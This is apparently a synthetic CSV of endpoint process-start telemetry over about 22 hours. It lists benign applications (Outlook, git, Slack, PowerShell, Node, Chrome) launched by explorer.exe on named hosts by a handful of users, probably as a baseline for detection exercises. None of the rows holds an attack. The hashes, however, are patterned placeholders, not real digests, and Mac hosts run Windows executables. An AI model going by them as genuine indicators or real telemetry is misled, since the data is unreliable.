2026-03-14 20:57:53.700,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0011c740946bb3e30011c740946bb3e30011c740946bb3e30011c740946bb3e3
2026-03-14 21:04:37.321,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=0020f52d4d72148e0020f52d4d72148e0020f52d4d72148e0020f52d4d72148e
2026-03-14 21:13:29.879,FIN-WS31,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0000cec9966bc1d20000cec9966bc1d20000cec9966bc1d20000cec9966bc1d2
2026-03-14 21:25:25.020,BLD-RUN-02,l.chen,1,git,"git",explorer.exe,,,SHA256=0021174e30d0ee720021174e30d0ee720021174e30d0ee720021174e30d0ee72
2026-03-14 21:35:09.150,BLD-RUN-02,a.velasquez,1,git,"git",explorer.exe,,,SHA256=000330fef6d80f63000330fef6d80f63000330fef6d80f63000330fef6d80f63
2026-03-14 21:49:27.948,MAC-DEV-17,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001ef80fdea2efad001ef80fdea2efad001ef80fdea2efad001ef80fdea2efad
2026-03-14 21:53:18.449,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001f4c13f2e06fbb001f4c13f2e06fbb001f4c13f2e06fbb001f4c13f2e06fbb
2026-03-14 22:00:44.035,FIN-WS22,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0008a91e3e8587510008a91e3e8587510008a91e3e8587510008a91e3e858751
2026-03-14 22:07:54.597,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000d65afb8051461000d65afb8051461000d65afb8051461000d65afb8051461
2026-03-14 22:14:28.829,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000e31cc65323004000e31cc65323004000e31cc65323004000e31cc65323004
2026-03-14 22:19:21.339,FIN-WS22,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00055e5969c7e6b200055e5969c7e6b200055e5969c7e6b200055e5969c7e6b2
2026-03-14 22:31:38.086,BLD-RUN-02,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0001c0d6217ab7c90001c0d6217ab7c90001c0d6217ab7c90001c0d6217ab7c9
2026-03-14 22:42:57.489,FIN-WS22,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000b0d45fbcea461000b0d45fbcea461000b0d45fbcea461000b0d45fbcea461
2026-03-14 22:55:55.853,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0002c5f3af346d010002c5f3af346d010002c5f3af346d010002c5f3af346d01
2026-03-14 23:00:20.517,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=00142867acf8255a00142867acf8255a00142867acf8255a00142867acf8255a
2026-03-14 23:06:45.155,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00044dd8c02598c400044dd8c02598c400044dd8c02598c400044dd8c02598c4
2026-03-14 23:13:31.523,MAC-DEV-04,t.owens,1,git,"git",explorer.exe,,,SHA256=00051d09967ae17b00051d09967ae17b00051d09967ae17b00051d09967ae17b
2026-03-14 23:24:09.150,BLD-RUN-02,r.kapoor,1,git,"git",explorer.exe,,,SHA256=0006aad87c1db5ec0006aad87c1db5ec0006aad87c1db5ec0006aad87c1db5ec
2026-03-14 23:28:08.367,MAC-DEV-04,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001002e9a5dd6efd001002e9a5dd6efd001002e9a5dd6efd001002e9a5dd6efd
2026-03-14 23:39:48.733,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=001ef79ca948c592001ef79ca948c592001ef79ca948c592001ef79ca948c592
2026-03-14 23:51:17.573,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0004ef52ff7a568d0004ef52ff7a568d0004ef52ff7a568d0004ef52ff7a568d
2026-03-14 23:58:36.755,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000637e0251fcccc000637e0251fcccc000637e0251fcccc000637e0251fcccc
2026-03-15 00:09:36.106,MAC-DEV-17,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=002133803f67d05e002133803f67d05e002133803f67d05e002133803f67d05e
2026-03-15 00:22:18.078,FIN-WS31,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=002304c84b333cec002304c84b333cec002304c84b333cec002304c84b333cec
2026-03-15 00:36:55.146,MAC-DEV-17,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0013a201bb13d5b60013a201bb13d5b60013a201bb13d5b60013a201bb13d5b6
2026-03-15 00:42:17.318,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00163fb5d5b5968c00163fb5d5b5968c00163fb5d5b5968c00163fb5d5b5968c
2026-03-15 00:56:53.199,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=0015413fbd2dfcd00015413fbd2dfcd00015413fbd2dfcd00015413fbd2dfcd0
2026-03-15 01:04:11.109,FIN-WS31,n.byrd,1,git,"git",explorer.exe,,,SHA256=0020e07945b951340020e07945b951340020e07945b951340020e07945b95134
2026-03-15 01:12:39.046,BLD-RUN-02,t.owens,1,git,"git",explorer.exe,,,SHA256=00199296b044e10200199296b044e10200199296b044e10200199296b044e102
2026-03-15 01:24:07.794,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001b93db0fd3c45c001b93db0fd3c45c001b93db0fd3c45c001b93db0fd3c45c
2026-03-15 01:27:29.955,MAC-DEV-04,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00221f7f84bff78600221f7f84bff78600221f7f84bff78600221f7f84bff786
2026-03-15 01:32:33.374,BLD-RUN-02,a.velasquez,1,node,"node",explorer.exe,,,SHA256=000fe953b192cc06000fe953b192cc06000fe953b192cc06000fe953b192cc06
2026-03-15 01:36:50.947,BLD-RUN-02,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000b5354aad4b160000b5354aad4b160000b5354aad4b160000b5354aad4b160
2026-03-15 01:45:37.046,FIN-WS22,t.owens,1,node,"node",explorer.exe,,,SHA256=001d1ff3cf36fa5b001d1ff3cf36fa5b001d1ff3cf36fa5b001d1ff3cf36fa5b
2026-03-15 01:51:30.490,MAC-DEV-04,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00130a16c5663d2b00130a16c5663d2b00130a16c5663d2b00130a16c5663d2b
2026-03-15 02:03:21.529,MAC-DEV-04,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0012b0886e4fa8eb0012b0886e4fa8eb0012b0886e4fa8eb0012b0886e4fa8eb
2026-03-15 02:12:30.556,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00052cd747022fda00052cd747022fda00052cd747022fda00052cd747022fda
2026-03-15 02:26:41.313,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00132fdd5fa5f77400132fdd5fa5f77400132fdd5fa5f77400132fdd5fa5f774
2026-03-15 02:33:38.261,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e887aab6761b3000e887aab6761b3000e887aab6761b3000e887aab6761b3
2026-03-15 02:38:34.771,MAC-DEV-04,t.owens,1,git,"git",explorer.exe,,,SHA256=000b25cd68f10b68000b25cd68f10b68000b25cd68f10b68000b25cd68f10b68
2026-03-15 02:42:06.047,FIN-WS22,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0022a83f8fe675060022a83f8fe675060022a83f8fe675060022a83f8fe67506
2026-03-15 02:53:32.461,MAC-DEV-04,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0000b69db27c82870000b69db27c82870000b69db27c82870000b69db27c8287
2026-03-15 03:08:11.330,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0012bd4432b256730012bd4432b256730012bd4432b256730012bd4432b25673
2026-03-15 03:22:32.652,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000199f024385441000199f024385441000199f024385441000199f024385441
2026-03-15 03:33:18.469,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000c06c4a556a2ba000c06c4a556a2ba000c06c4a556a2ba000c06c4a556a2ba
2026-03-15 03:42:04.973,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001016621dbc20cb001016621dbc20cb001016621dbc20cb001016621dbc20cb
2026-03-15 03:46:59.576,BLD-RUN-02,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0005f593205dcc6e0005f593205dcc6e0005f593205dcc6e0005f593205dcc6e
2026-03-15 03:56:12.716,MAC-DEV-17,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000051843cd979fa000051843cd979fa000051843cd979fa000051843cd979fa
2026-03-15 04:00:29.796,FIN-WS22,n.byrd,1,git,"git",explorer.exe,,,SHA256=000a478306cd2bfe000a478306cd2bfe000a478306cd2bfe000a478306cd2bfe
2026-03-15 04:06:02.601,MAC-DEV-04,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000b36a9bb8cd971000b36a9bb8cd971000b36a9bb8cd971000b36a9bb8cd971
2026-03-15 04:18:51.021,MAC-DEV-17,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0009de594a4d66f00009de594a4d66f00009de594a4d66f00009de594a4d66f0
2026-03-15 04:29:36.412,FIN-WS22,n.byrd,1,node,"node",explorer.exe,,,SHA256=00232b20cbfd089c00232b20cbfd089c00232b20cbfd089c00232b20cbfd089c
2026-03-15 04:42:59.330,FIN-WS22,m.sato,1,node,"node",explorer.exe,,,SHA256=0011af32b66bdf460011af32b66bdf460011af32b66bdf460011af32b66bdf46
2026-03-15 04:46:00.627,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000f1480189a8a8b000f1480189a8a8b000f1480189a8a8b000f1480189a8a8b
2026-03-15 04:53:09.462,MAC-DEV-17,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00170499c178b26000170499c178b26000170499c178b26000170499c178b260
2026-03-15 04:57:46.681,MAC-DEV-17,n.byrd,1,node,"node",explorer.exe,,,SHA256=001cf1f159236cb9001cf1f159236cb9001cf1f159236cb9001cf1f159236cb9
2026-03-15 05:09:28.114,FIN-WS31,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00087b90670946df00087b90670946df00087b90670946df00087b90670946df
2026-03-15 05:14:54.661,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0016830df34c932e0016830df34c932e0016830df34c932e0016830df34c932e
2026-03-15 05:18:40.604,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=00040f989b8f135000040f989b8f135000040f989b8f135000040f989b8f1350
2026-03-15 05:26:55.703,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=001fdb19f3be6db0001fdb19f3be6db0001fdb19f3be6db0001fdb19f3be6db0
2026-03-15 05:30:06.077,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0003e8c21c4b33a80003e8c21c4b33a80003e8c21c4b33a80003e8c21c4b33a8
2026-03-15 05:38:41.931,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0006fdf912a2d6d50006fdf912a2d6d50006fdf912a2d6d50006fdf912a2d6d5
2026-03-15 05:50:38.880,MAC-DEV-17,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0008ce21369c21d80008ce21369c21d80008ce21369c21d80008ce21369c21d8
2026-03-15 05:54:36.209,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=00209412f1a1fb3400209412f1a1fb3400209412f1a1fb3400209412f1a1fb34
2026-03-15 05:58:11.570,MAC-DEV-04,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0013ba6ade4686040013ba6ade4686040013ba6ade4686040013ba6ade468604
2026-03-15 06:10:15.978,MAC-DEV-04,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0001ef86bae55e070001ef86bae55e070001ef86bae55e070001ef86bae55e07
2026-03-15 06:21:42.129,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00083775c073252300083775c073252300083775c073252300083775c0732523
2026-03-15 06:25:04.802,MAC-DEV-04,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00013fbee185b20800013fbee185b20800013fbee185b20800013fbee185b208
2026-03-15 06:39:27.998,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0012858c5c92890e0012858c5c92890e0012858c5c92890e0012858c5c92890e
2026-03-15 06:49:50.715,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00140b74b37f183c00140b74b37f183c00140b74b37f183c00140b74b37f183c
2026-03-15 06:54:16.347,BLD-RUN-02,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001f32a08036a349001f32a08036a349001f32a08036a349001f32a08036a349
2026-03-15 07:02:20.730,MAC-DEV-17,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000981f1d269bc0e000981f1d269bc0e000981f1d269bc0e000981f1d269bc0e
2026-03-15 07:07:17.223,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001d6104686f740d001d6104686f740d001d6104686f740d001d6104686f740d
2026-03-15 07:12:24.777,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000f9496aa5882fb000f9496aa5882fb000f9496aa5882fb000f9496aa5882fb
2026-03-15 07:22:27.678,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00236576b4de395e00236576b4de395e00236576b4de395e00236576b4de395e
2026-03-15 07:28:18.552,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0020ea3c9e5aef820020ea3c9e5aef820020ea3c9e5aef820020ea3c9e5aef82
2026-03-15 07:34:24.443,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00028e175dbee62900028e175dbee62900028e175dbee62900028e175dbee629
2026-03-15 07:45:52.100,MAC-DEV-04,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0020371d7d753a460020371d7d753a460020371d7d753a460020371d7d753a46
2026-03-15 07:49:33.833,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=001385b4ffec2fc9001385b4ffec2fc9001385b4ffec2fc9001385b4ffec2fc9
2026-03-15 08:03:08.111,FIN-WS31,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00092c1d4c5d518100092c1d4c5d518100092c1d4c5d518100092c1d4c5d5181
2026-03-15 08:16:04.207,BLD-RUN-02,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0005d5abd75a705e0005d5abd75a705e0005d5abd75a705e0005d5abd75a705e
2026-03-15 08:26:59.666,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000cff2c4434b638000cff2c4434b638000cff2c4434b638000cff2c4434b638
2026-03-15 08:37:42.141,BLD-RUN-02,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000b5aad059b7ed8000b5aad059b7ed8000b5aad059b7ed8000b5aad059b7ed8
2026-03-15 08:49:50.290,BLD-RUN-02,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0017e9817e205fd00017e9817e205fd00017e9817e205fd00017e9817e205fd0
2026-03-15 08:59:32.286,BLD-RUN-02,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001c309c109e81af001c309c109e81af001c309c109e81af001c309c109e81af
2026-03-15 09:09:28.361,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00014840d4e9b9ee00014840d4e9b9ee00014840d4e9b9ee00014840d4e9b9ee
2026-03-15 09:24:16.402,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=0000d315c4cb37930000d315c4cb37930000d315c4cb37930000d315c4cb3793
2026-03-15 09:30:31.954,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000755025d82c5d9000755025d82c5d9000755025d82c5d9000755025d82c5d9
2026-03-15 09:43:23.062,FIN-WS22,l.chen,1,node,"node",explorer.exe,,,SHA256=000f3b3a8896499e000f3b3a8896499e000f3b3a8896499e000f3b3a8896499e
2026-03-15 09:49:27.869,FIN-WS31,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000dc6de398337a6000dc6de398337a6000dc6de398337a6000dc6de398337a6
2026-03-15 09:54:09.736,MAC-DEV-17,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00030924141f84cf00030924141f84cf00030924141f84cf00030924141f84cf
2026-03-15 10:06:58.529,MAC-DEV-04,a.velasquez,1,node,"node",explorer.exe,,,SHA256=000399809e4a60f7000399809e4a60f7000399809e4a60f7000399809e4a60f7
2026-03-15 10:14:07.134,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017c400ec5064da0017c400ec5064da0017c400ec5064da0017c400ec5064da
2026-03-15 10:17:31.549,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=000c8df21a11ae24000c8df21a11ae24000c8df21a11ae24000c8df21a11ae24
2026-03-15 10:22:55.618,FIN-WS31,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00129d7010b4b88600129d7010b4b88600129d7010b4b88600129d7010b4b886
2026-03-15 10:35:17.662,FIN-WS31,t.owens,1,node,"node",explorer.exe,,,SHA256=0017439672abb7f50017439672abb7f50017439672abb7f50017439672abb7f5
2026-03-15 10:47:58.827,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0000dab21c8968380000dab21c8968380000dab21c8968380000dab21c896838
2026-03-15 10:52:52.228,MAC-DEV-04,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001506bff299435c001506bff299435c001506bff299435c001506bff299435c
2026-03-15 10:56:24.284,FIN-WS31,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0016f861443b19640016f861443b19640016f861443b19640016f861443b1964
2026-03-15 11:06:02.384,FIN-WS22,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001975cab29749d3001975cab29749d3001975cab29749d3001975cab29749d3
2026-03-15 11:13:58.289,MAC-DEV-04,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001027fee5ae9de7001027fee5ae9de7001027fee5ae9de7001027fee5ae9de7
2026-03-15 11:23:14.854,FIN-WS31,r.kapoor,1,git,"git",explorer.exe,,,SHA256=000b607c4885204c000b607c4885204c000b607c4885204c000b607c4885204c
2026-03-15 11:26:26.691,BLD-RUN-02,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00124ec094ff64a400124ec094ff64a400124ec094ff64a400124ec094ff64a4
2026-03-15 11:29:57.233,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0011230615a357cb0011230615a357cb0011230615a357cb0011230615a357cb
2026-03-15 11:42:27.870,BLD-RUN-02,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008dc1fc97988dd0008dc1fc97988dd0008dc1fc97988dd0008dc1fc97988dd
2026-03-15 11:48:56.939,FIN-WS22,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0010fe46ba57d2280010fe46ba57d2280010fe46ba57d2280010fe46ba57d228
2026-03-15 11:56:43.233,FIN-WS31,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000d850f7f8f381b000d850f7f8f381b000d850f7f8f381b000d850f7f8f381b
2026-03-15 12:03:05.755,MAC-DEV-17,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0010bbe6ed120e920010bbe6ed120e920010bbe6ed120e920010bbe6ed120e92
2026-03-15 12:15:57.460,MAC-DEV-17,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000254c3f84a0297000254c3f84a0297000254c3f84a0297000254c3f84a0297
2026-03-15 12:20:42.729,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008974f068ab4bb0008974f068ab4bb0008974f068ab4bb0008974f068ab4bb
2026-03-15 12:34:49.378,MAC-DEV-04,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001318af541ed893001318af541ed893001318af541ed893001318af541ed893
2026-03-15 12:38:12.828,FIN-WS31,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001d69b734af32e1001d69b734af32e1001d69b734af32e1001d69b734af32e1
2026-03-15 12:42:48.481,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007a80ad06407010007a80ad06407010007a80ad06407010007a80ad0640701
2026-03-15 12:48:32.049,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0005534d1c18aa0b0005534d1c18aa0b0005534d1c18aa0b0005534d1c18aa0b
2026-03-15 13:01:05.435,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000afbd60ec2085c000afbd60ec2085c000afbd60ec2085c000afbd60ec2085c
2026-03-15 13:10:30.258,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000c30c93e6bb535000c30c93e6bb535000c30c93e6bb535000c30c93e6bb535
2026-03-15 13:19:01.224,FIN-WS31,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0012893a3d0782b10012893a3d0782b10012893a3d0782b10012893a3d0782b1
2026-03-15 13:33:39.750,FIN-WS22,n.byrd,1,git,"git",explorer.exe,,,SHA256=000ce183f947a33d000ce183f947a33d000ce183f947a33d000ce183f947a33d
2026-03-15 13:46:52.627,BLD-RUN-02,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0003d5c72c3ee21f0003d5c72c3ee21f0003d5c72c3ee21f0003d5c72c3ee21f
2026-03-15 13:59:09.062,MAC-DEV-17,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001d5f6a7713d0d4001d5f6a7713d0d4001d5f6a7713d0d4001d5f6a7713d0d4
2026-03-15 14:03:25.202,MAC-DEV-17,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000b7c5ecebab75a000b7c5ecebab75a000b7c5ecebab75a000b7c5ecebab75a
2026-03-15 14:11:16.695,BLD-RUN-02,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001ce74f94c6bebb001ce74f94c6bebb001ce74f94c6bebb001ce74f94c6bebb
2026-03-15 14:25:12.661,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001bb50b1ba7ebf5001bb50b1ba7ebf5001bb50b1ba7ebf5001bb50b1ba7ebf5
2026-03-15 14:39:16.899,BLD-RUN-02,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0019f782c3d69a120019f782c3d69a120019f782c3d69a120019f782c3d69a12
2026-03-15 14:43:47.233,MAC-DEV-17,t.owens,1,git,"git",explorer.exe,,,SHA256=00104b88c1140a7e00104b88c1140a7e00104b88c1140a7e00104b88c1140a7e
2026-03-15 14:54:38.235,BLD-RUN-02,t.owens,1,node,"node",explorer.exe,,,SHA256=0009bf824b9cff920009bf824b9cff920009bf824b9cff920009bf824b9cff92
2026-03-15 15:03:02.977,FIN-WS22,t.owens,1,git,"git",explorer.exe,,,SHA256=00184ccb2760d6b600184ccb2760d6b600184ccb2760d6b600184ccb2760d6b6
2026-03-15 15:16:14.064,FIN-WS31,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0005aab02aec1fd40005aab02aec1fd40005aab02aec1fd40005aab02aec1fd4
2026-03-15 15:19:46.911,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=000ad38fd0775264000ad38fd0775264000ad38fd0775264000ad38fd0775264
2026-03-15 15:30:41.094,FIN-WS31,t.owens,1,git,"git",explorer.exe,,,SHA256=00152418d81de21f00152418d81de21f00152418d81de21f00152418d81de21f
2026-03-15 15:34:34.879,BLD-RUN-02,t.owens,1,git,"git",explorer.exe,,,SHA256=000776ba39ea9d95000776ba39ea9d95000776ba39ea9d95000776ba39ea9d95
2026-03-15 15:47:16.507,MAC-DEV-04,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0017537c0f3084550017537c0f3084550017537c0f3084550017537c0f308455
2026-03-15 15:52:44.179,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0007161dc9fbf54b0007161dc9fbf54b0007161dc9fbf54b0007161dc9fbf54b
2026-03-15 16:00:24.614,FIN-WS31,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0016a4b2d77351ec0016a4b2d77351ec0016a4b2d77351ec0016a4b2d77351ec
2026-03-15 16:09:16.709,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001874e7746cf9eb001874e7746cf9eb001874e7746cf9eb001874e7746cf9eb
2026-03-15 16:21:09.285,FIN-WS31,l.chen,1,git,"git",explorer.exe,,,SHA256=000eae1d4e4bb126000eae1d4e4bb126000eae1d4e4bb126000eae1d4e4bb126
2026-03-15 16:24:38.666,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=001d5c7e104e6ee0001d5c7e104e6ee0001d5c7e104e6ee0001d5c7e104e6ee0
2026-03-15 16:28:27.290,MAC-DEV-04,m.sato,1,node,"node",explorer.exe,,,SHA256=0017a8123660c4d70017a8123660c4d70017a8123660c4d70017a8123660c4d7
2026-03-15 16:42:39.280,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=001fbfbb24f35f52001fbfbb24f35f52001fbfbb24f35f52001fbfbb24f35f52
2026-03-15 16:55:08.916,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=001bdd2bb93c8a7a001bdd2bb93c8a7a001bdd2bb93c8a7a001bdd2bb93c8a7a
2026-03-15 17:08:55.505,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=000dd6f2da190feb000dd6f2da190feb000dd6f2da190feb000dd6f2da190feb
2026-03-15 17:13:44.543,FIN-WS22,e.park,1,node,"node",explorer.exe,,,SHA256=000790a3e32d7f73000790a3e32d7f73000790a3e32d7f73000790a3e32d7f73
2026-03-15 17:19:55.740,MAC-DEV-04,t.owens,1,git,"git",explorer.exe,,,SHA256=001537c9e4c9f3f4001537c9e4c9f3f4001537c9e4c9f3f4001537c9e4c9f3f4
2026-03-15 17:34:28.048,BLD-RUN-02,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0009128484e6c5a10009128484e6c5a10009128484e6c5a10009128484e6c5a1
2026-03-15 17:39:47.285,FIN-WS22,t.owens,1,git,"git",explorer.exe,,,SHA256=00174b85e7fa0c4f00174b85e7fa0c4f00174b85e7fa0c4f00174b85e7fa0c4f
2026-03-15 17:44:08.645,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=00184054f7b046b100184054f7b046b100184054f7b046b100184054f7b046b1
2026-03-15 17:49:03.048,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001ee9f588433924001ee9f588433924001ee9f588433924001ee9f588433924
2026-03-15 17:52:10.891,BLD-RUN-02,n.byrd,1,node,"node",explorer.exe,,,SHA256=0008e3d0e062c6d40008e3d0e062c6d40008e3d0e062c6d40008e3d0e062c6d4
2026-03-15 17:55:16.862,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=0006e3c6a41c2b330006e3c6a41c2b330006e3c6a41c2b330006e3c6a41c2b33
2026-03-15 18:01:26.772,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=000772f9b04f02c1000772f9b04f02c1000772f9b04f02c1000772f9b04f02c1
2026-03-15 18:05:47.275,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=0003349612e8582c0003349612e8582c0003349612e8582c0003349612e8582c
2026-03-15 18:09:02.854,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=000eed59f6502a32000eed59f6502a32000eed59f6502a32000eed59f6502a32
2026-03-15 18:17:20.682,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000dd126bde6ad7b000dd126bde6ad7b000dd126bde6ad7b000dd126bde6ad7b
2026-03-15 18:22:08.079,MAC-DEV-17,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0013269618d517350013269618d517350013269618d517350013269618d51735
2026-03-15 18:27:49.884,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001e6d487b164768001e6d487b164768001e6d487b164768001e6d487b164768
2026-03-15 18:33:52.810,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000ad68140c2dc09000ad68140c2dc09000ad68140c2dc09000ad68140c2dc09
